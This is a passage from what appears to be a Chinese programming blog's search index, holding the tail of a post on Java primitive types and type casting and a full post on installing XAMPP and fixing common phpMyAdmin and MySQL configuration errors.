中，小数的字面量默认是 double 类型。</strong><br><strong>2. float 比 int 的范围大，int 比 float 的精度达。</strong><br><strong>3. double 比 long 的范围大，long 比 double 的精度大。</strong></p></blockquote><br>**三个特殊的浮点数值：**<table><thead><tr><th align="left">数值</th><th align="left">表示方式</th></tr></thead><tbody><tr><td align="left">正无穷大</td><td align="left">Double.POSITIVE_INFINITY</td></tr><tr><td align="left">负无穷大</td><td align="left">Double.NEGATIVE_INFINITY</td></tr><tr><td align="left">NaN(不是一个数字)</td><td align="left">Double.NaN</td></tr></tbody></table><p><strong>需要注意的是， 不能像如下代码一样检测一个值是否等于 NaN ：</strong></p><pre><code>if (x == Double.NaN) //这个判断结果永远是 false</code></pre><p><strong>因为所有的“非数值”的值都认为是不相同的，但是可以使用 Double.isNaN 方法来检测一个值是否“不是一个数”：</strong></p><pre><code>if (Double.isNaN(x)) //检测 x 是否“不是一个数值”，若 x 不是一个数值则返回 true，否则返回 false</code></pre><br>### 字符型：char 类型，用来表示单个字符。<p><strong>char 类型通常用来表示字符常量，例如 ‘A’ 是编码为 65 所对应的字符常量，它与 “A” 不同，”A” 是一个包含字符 ‘A’ 的字符串。</strong></p><ul><li><strong>Unicode 编码：</strong> 是全球范围内的编码方法，可以表示十六进制值，其范围从 \u0000 到 \Uffff ，包含了英文、中文、日文、韩文等共 8 万多个字符。</li><li><strong>char：</strong> 用 UTF-16 编码描述一个代码单元，含 2 个字节，无符号的整数。范围是 0~65535，可以表示 Unicode 最常用的部分.<blockquote><p><code>但是，强烈建议不要在程序中使用 UTF-16 编码，尽量使用 UTF-8 编码，除非确实需要对 UTF-16 代码单元进行操作。</code></p></blockquote></li></ul><p><strong>特殊字符的转义序列符</strong></p><table><thead><tr><th align="left">转义序列</th><th align="left">名称</th><th align="left">Unicode 值</th><th align="left">转义序列</th><th align="left">名称</th><th align="left">Unicode 值</th></tr></thead><tbody><tr><td align="left">\b</td><td align="left">退格</td><td align="left">\u0008</td><td align="left">"</td><td align="left">双引号</td><td align="left">\u0022</td></tr><tr><td align="left">\t</td><td align="left">制表</td><td align="left">\u0009</td><td align="left">'</td><td align="left">单引号</td><td align="left">\u0027</td></tr><tr><td align="left">\n</td><td align="left">换行</td><td align="left">\u000a</td><td align="left">\</td><td align="left">反斜杠</td><td align="left">\u005c</td></tr><tr><td align="left">\r</td><td align="left">回车</td><td align="left">\u000d</td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><p><strong>代码示例</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">char</span> c <span class="token operator">=</span> <span class="token number">65</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token comment">//'A'</span><span class="token keyword">char</span> b <span class="token operator">=</span> <span class="token char">'b'</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">66</span><span class="token keyword">char</span> d <span class="token operator">=</span> <span class="token char">'中'</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//20013</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>常用字符<br>‘0’ 48，将 ‘1’ 转化为 int 类型 1 只需要将 ‘1’ 减去 ‘0’ 或 48;<br>‘A’ 65<br>‘a’ 97<br>\为转义字符</p></blockquote><br>### Java boolean 类型（布尔型）<p><strong>boolean（布尔）类型有两个值：false（假）和 true（真），用来判定逻辑条件。<code>整数型和布尔值之间不能进行相互转换</code>。</strong></p><br>## 数据类型转换### （隐式）自动类型转换<p><strong>小类型到大类型的转换:</strong><br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fd512ckyagj21kw0yf4be.jpg" alt="数据类型隐式转换"></p><blockquote><p>图中 6 个实心箭头表示无信息丢失的转换，3 个虚线箭头表示可能有精度损失的转换。</p></blockquote><p>隐式转换示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span> b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">//这里没有类型转换，只是普通的赋值</span><span class="token keyword">long</span> l <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token comment">//int -&gt; long</span><span class="token keyword">byte</span> m <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">//0000 0101</span><span class="token keyword">short</span> n <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//1111 1111 1111 1110</span><span class="token comment">//m -&gt; int:0000 0000 0000 0000 0000 0000 0000 0101</span><span class="token comment">//n -&gt; int:1111 1111 1111 1111 1111 1111 1111 1110</span><span class="token keyword">int</span> j <span class="token operator">=</span> m <span class="token operator">+</span> n<span class="token punctuation">;</span><span class="token comment">//j: 00000000 00000000 00000000 0000 0011</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">123456789</span><span class="token punctuation">;</span><span class="token keyword">float</span> f <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token comment">//f = 1.23456792E8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>两个操作数进行运算，会自动将两个操作数转换为同一种类型，然后再进行计算。<br>如果两个操作数中有一个是 double 类型，另一个操作数将会转换为 double 类型。<br>否则，如果其中一个操作数是 float 类型，另一个操作数将会转换为 float 类型。<br>否则，如果其中一个操作数是 long 类型，另一个操作数将会转换为 long 类型。<br>否则，两个操作数都将被转换为 int 类型。</p></blockquote><br>### （显式）强制类型转换**大类型到小类型的转换：**<p>double -&gt; float -&gt; long -&gt; int -&gt; short -&gt; byte<br>double -&gt; float -&gt; long -&gt; int -&gt; char</p><p>显式转换示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span> m <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">byte</span> n <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span><span class="token comment">//语法： （转换的类型）被转换的值。</span><span class="token keyword">byte</span> k <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>m <span class="token operator">+</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//11</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span><span class="token keyword">byte</span> j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span>i<span class="token punctuation">;</span><span class="token comment">//-128</span><span class="token comment">//i: 0111 1111 + 1 = 1000 0000</span><span class="token comment">//i: 0000 0000 0000 0000 0000 0000 1000 0000</span><span class="token comment">//j: 1000 0000</span><span class="token comment">//这里将 i 转换为 byte 后从 128 转换为了-128</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>由此可见，显式转换有可能将数值改变，所以在进行显式转换时一定要确定该转换是否会对数值造成影响，慎用</p></blockquote><p><strong>浮点型强制转换为整型的时候会直接舍弃小数部分，若想进行四舍五入则需要使用 Math.round 方法：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">9.997</span><span class="token punctuation">;</span><span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>x<span class="token punctuation">;</span><span class="token comment">//y = 9</span><span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//z = 10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>如果试图将一个数值从一种类型强制转换为另一种类型，而又超出了目标类型的表示范围，结果就会截断成一个完全不同的值，如：(byte)300 的实际值为 44.</p></blockquote><br>## 引用类型待补充]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据类型 </tag>
            
            <tag> 类型转换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XAMPP 安装及遇到的问题</title>
      <link href="/2016/10/20/xampp-an-zhuang-ji-yu-dao-de-wen-ti/"/>
      <url>/2016/10/20/xampp-an-zhuang-ji-yu-dao-de-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。XAMPP 是一个易于安装且包含 MySQL、PHP 和 Perl 的 Apache 发行版。XAMPP 非常容易安装和使用：只需下载，解压缩，启动即可。</p><span id="more"></span><h2 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h2><p><strong>先附上中文界面(菜单内部仍为英文)：</strong><br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fdiwv3as6aj20kp0d9tba.jpg" alt="XAMPP 中文版界面"><br>XAMPP 下载地址：<a href="http://www.xampps.com/">中文版</a> <a href="http://www.xampp.org/">官网</a></p><p>linux 下课使用 wget 命令下载</p><pre><code>https://www.apachefriends.org/xampp-files/5.6.24/xampp-linux-x64-5.6.24-1-installer.run</code></pre><p>下载安装后打开为如下界面：</p><p><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly9fdiwz8xrcxj20fa05hjte.jpg" alt="XAMPP 初始界面"></p><p>看起来好像出了很多错误，当然并没有。</p><p><strong>默认 Apache 组件处于运行中（注意绿色），但没有加载到 windows 系统中作为服务。先 stop 停止掉 Apache ，然后点击左侧红色的 X 安装 apache 服务，需要添加 Mysql 也是同样的操作。</strong></p><p><strong>我们开启 Apache 服务，X 变为绿色的 √，然后打开浏览器访问 localhost (或 127.0.0.1 本机地址)，看到下面的页面，说明服务器环境搭建成功。</strong></p><p><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1fdix261yk9j20go0kptb7.jpg" alt="PHP 界面"></p><p><strong>那我们自己写的文件该放在哪里才能运行呢？</strong></p><p>答案是<strong>在 <code>xampp\htdocs</code> 目录下，如果存在 index.php 文件，优先执行该文件，如果不存在，则访问 localhost 时将显示网站目录。</strong></p><p>下面是我将原来目录的 index.php 修改为 index2.php 时访问 localhost 出现的页面:<br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fdix5hsu2aj20e50cx75l.jpg" alt="index.php 错误示例"></p><h2 id="服务器环境搭建成功后需要做的事"><a href="#服务器环境搭建成功后需要做的事" class="headerlink" title="服务器环境搭建成功后需要做的事"></a>服务器环境搭建成功后需要做的事</h2><ol><li><p><strong>修改 phpMyAdmin 配置</strong><br>a. 首先打开 D:/XAMPP/phpMyAdmin 文件夹中的 config.inc.php 文件。<br>b. 搜索 <code>$cfg['Servers'][$i]['auth_type'] = 'config';</code>,将其中的 config（系缺省值）更改为“cookie”保存。</p></li><li><p><strong>登录 XAMPP</strong><br>a. 通过默认主页 <a href="http://localhost/">http://localhost</a> 左侧的 phpmyadmin 导航栏进入 phpmyadmin 界面（可直接通过 <a href="http://localhost/phpmyadmin/">http://localhost/phpmyadmin/</a> 进入 web 登陆界面，输入用户名 root 密码 root 后直接点击登录即可）<br><strong>注：</strong><em>在默认状态下，phpmyadmin 有两个用户名，分别是 pma 和 root 。其中，root 是管理员身份，而 pma 则是普通用户身份，但二者在缺省状态下均无密码</em><br>若提示 服务器无响应(或者本地 MySQL 服务器的套接字没有正确配置)的问题，请看后面解决办法</p></li><li><p><strong>建立新的管理员账号及删除原有的 root 账号</strong><br>进入用户选项卡，点击 root 账号编辑其权限，在底端的修改密码输入相应的密码<br><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fdixbym4g9j20y00hjtbp.jpg" alt="用户选项卡"><br><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fdixcnissej20nt08egm2.jpg" alt="修改密码"></p></li></ol><p>**需要注意</p><blockquote><ol><li>root 等管理员密码无需在 config.inc.php 中更改。</li><li>只有 pma 不设置密码时，XAMPP 主界面的 MySQL database 的状态才会显示为 ACTIVATED 状态！</li><li>不要使用 XAMPP for Windows Version 1.5.2 自带的 mysql 管理软件来设置。如果设置了，会在 C:\windows &gt;目录下产生一个 my.ini 文件。如果要重新安装，则需要将此 my.ini 文件删除，以免影响后续设置。</li><li>必要时请更改默认端口，APACHE 的默认端口是 80，如果你装有 IIS，就会有冲突。所以，要更改一个端口。打开 XAMPP/apache/conf/httpd.conf，把 listen 80 改为其它的端口，如 99, 8080 等。</li><li>您可能会遇到安装了 xampp，在本机通过 localhost 和 ip 都可以访问，但是局域网其他机器不能访问的问题。解决方法是：修改 XAMPP/apache/httpd.conf，把 Listen 80 改成 Listen 192.168.0.188:80, 192.168.0.188 换成您服务器的 ip。</li></ol></blockquote><h2 id="我遇到的问题以及解决方法："><a href="#我遇到的问题以及解决方法：" class="headerlink" title="我遇到的问题以及解决方法："></a>我遇到的问题以及解决方法：</h2><h3 id="服务器无响应-或者本地-MySQL-服务器的套接字没有正确配置-的问题"><a href="#服务器无响应-或者本地-MySQL-服务器的套接字没有正确配置-的问题" class="headerlink" title="服务器无响应(或者本地 MySQL 服务器的套接字没有正确配置)的问题"></a>服务器无响应(或者本地 MySQL 服务器的套接字没有正确配置)的问题</h3><ol><li><p>第一种情况：（深度清理垃圾导致 host.MYD 丢失）<br>原因：host.MYD 文件是一个 0 字节文件，即没有任何内容，但在启动 mysql 时会被调用，写入一些临时信息，深度清理垃圾时，我选择扫描空文件和空文件夹，就将 host.MYD 扫描到并删除了，再次启动 wamp，就产生如上问题；</p><blockquote><p>解决方案：第一次安装 wamp 时，在安装目录下找到 host.MYD，其路径为 <code>"C:\wamp\bin\mysql\mysql5.5.20\data\mysql\host.MYD (我默认安装 wamp 在 C 盘根目录)"</code>，你可以选择备份一个 host.MYD，或者新建一个空的“文本文档.txt”将其改为“host.MYD”，放到其正确路径下即           可。</p></blockquote></li><li><p>第二种情况：（防火墙阻止导致 mysql 无法启动）<br>原因：未启动本地 mysql 服务器</p><blockquote><p>解决方法：<br>     第一步，找到 mysql 的安装路径 D:\Program Files\MySQL\MySQL Server 5.1\bin<br>     第二步，双击 mysqld.exe 文件，如果 windows 防火墙弹出阻止提示框，点击解除阻止即可</p></blockquote></li><li><p>第三种情况：(mysql 套接字文件绑定 ip 无效)<br>原因：如果未指定主机名或指定了特殊的主机名 localhost，将使用 Unix 套接字，Unix 套接字默认为 <code>/tmp/mysql.sock</code>，而本机并没有配置这样的套接字文件，所以自然是连接失败了。</p><blockquote><p>解决方法：找到 phpmyadmin 文件夹,在 <code>wamp\phpmyadmin</code> 下（具体视自己安装的路径来查找），找到 <code>config.inc.php</code> 文件，用 notepad (记事本)等软件打开找到 <code>$cfg['Servers'][$i]['host'] = 'localhost';</code> 这一行，然后将这里的 localhost 修改为 127.0.0.1。有网友建议添加 <code>$cfg['Servers'][$i]['hide_db'] = ‘information_schema’;</code> //使用登陆后看不见 information_schema 数据库，这一句其实不加也无所谓。</p></blockquote></li></ol><h3 id="phpMyAdmin-界面左边出现错误提示"><a href="#phpMyAdmin-界面左边出现错误提示" class="headerlink" title="phpMyAdmin 界面左边出现错误提示"></a>phpMyAdmin 界面左边出现错误提示</h3><p><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1fdixhm6ecxj205g0b3aam.jpg" alt="phpMyAdmin 显示错误"><br><strong>解决方法</strong>：（我居然吭哧半天看懂了英文…以防以后在遇到的时候看不懂。。。先记下来= =哈哈）<br><strong>方法一：</strong></p><blockquote><p>You have to run the create_tables.sql inside the examples/ folder on phpMyAdmin to create the tables needed for the advanced features. That or disable those features by commenting them on the config file.</p><p>That’s an alternative, yes. For importing the .sql file, you should go to the import tab on phpmyadmin and select that file, and then send the form. Just that.</p></blockquote><p>在 phpMyAdmin 的导入选项卡中选择 <code>XAMPP\phpMyAdmin\examples\</code> 中的 create_tables.sql 文件上传并执行即可。</p><p><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fdixjf50fej20op0jctah.jpg" alt="导入"><br><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fdixk0jwyij207906hglv.jpg" alt="导入 sql"></p><p>如果还提示上述错误，则</p><blockquote><p>You will find <code>create_tables.sql.gz</code> file in <code>/usr/share/doc/phpmyadmin/examples/</code><br>Extract it and change pma_ prefix by pma__ or vice versa</p></blockquote><p>编辑 <code>create_tables.sql</code> 文件，将其中所有的的 pma_（单下划线）换成 pma__（双下划线）后再次上传执行即可。<br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fdixv68ldsj20ts0ppaeo.jpg" alt="修改 create_tables.sql 文件"></p><p><strong>方法二：（适用于 Linux 系统）</strong><br><strong>直接执行</strong></p><pre><code>sudo dpkg-reconfigure phpmyadmin</code></pre><h3 id="使用配置文件中定义的控制用户连接失败"><a href="#使用配置文件中定义的控制用户连接失败" class="headerlink" title="使用配置文件中定义的控制用户连接失败"></a>使用配置文件中定义的控制用户连接失败</h3><p><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1fdixwrinafj207p01cq2t.jpg" alt="控制用户连接失败"></p><p>编辑 <code>XAMPP\phpMyAdmin\config.inc.php</code> 文件将</p><pre><code>$cfg['Servers'][$i]['controluser'] = '';$cfg['Servers'][$i]['controlpass'] = '';</code></pre><p>两行改成你的数据库用户名和密码，保存即可:</p><p><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fdixz16ff0j20a201aq2w.jpg" alt="修改用户名密码 1"></p><p>改为：</p><p><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fdixzryyvdj20a701baa0.jpg" alt="修改用户名密码 2"></p>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
            <tag> XAMPP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
